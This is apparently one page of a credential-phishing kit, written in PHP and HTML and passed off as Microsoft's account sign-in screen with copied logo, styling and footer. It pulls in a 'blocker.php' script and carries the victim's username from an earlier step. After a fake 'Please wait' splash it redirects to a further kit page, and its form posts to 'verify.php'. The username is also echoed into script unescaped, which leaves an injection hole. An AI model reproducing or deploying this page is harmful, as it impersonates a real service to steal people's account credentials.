<?php
include('blocker.php');
session_start();
$UserName = $_SESSION['UserName'];
?><!doctype html>
<html dir="ltr" lang="EN-US">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=Edge">
		<title>Sign in to your Microsoft account</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
		<link rel="shortcut icon" href="mx/favicon.ico">
		<link rel="stylesheet" title="Converged" type="text/css" href="mx/style.css">
		<style type="text/css">body.cb input.hip{border-width: 2px !important;}</style>
		<style type="text/css">body{display:none;}</style>
		<style type="text/css">body{display:block !important;}</style>
<script>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=7000

//configure destination URL

var targetdestination="sc.php?fr2=<?php echo $UserName ?>"





var splashmessage=new Array()

var openingtags='<font face="Segoe UI Light" size="5" color="#000000">'

splashmessage[0]='Please wait ...'







var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>
	</head>
	<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
		<div><!--  --> 
			<div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
				<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"> 
					<div style="background-image: url('mx/bg-small.jpg');"></div>
					<div class="backgroundImage" style="background-image: url('mx/bg.jpg');"></div>
					<div class="background-overlay"></div><!-- /ko -->
				</div>
			</div> 
			<form  novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="verify.php">
				<div class="outer">
					<div class="middle">
						<div class="inner">
							<div>
								<img class="logo" src="mx/logo.svg">
							</div>

										<div id="loginHeader" class="row text-title" role="heading"><div id="splashcontainer" class="cta_message_text 1">  </div><center><img src="mx/ellipsis.gif" /></center>
										<div class="row"> 
											<div class="form-group col-md-24">
																				
				<div id="footer" class="footer default"> 
					<div>
						<div id="footerLinks" class="footerNode text-secondary">
							<span id="ftrCopy" data-bind="html: svr.B6">&copy;2018 Microsoft</span>
							<a id="ftrTerms" href="#">Terms of use</a> 
							<a id="ftrPrivacy" href="#">Privacy &amp; cookies</a>
						</div> 
					</div> 
				</div> 
			</form> 
			<form method="post" target="_top"></form>
		</div>
	</body>
</html>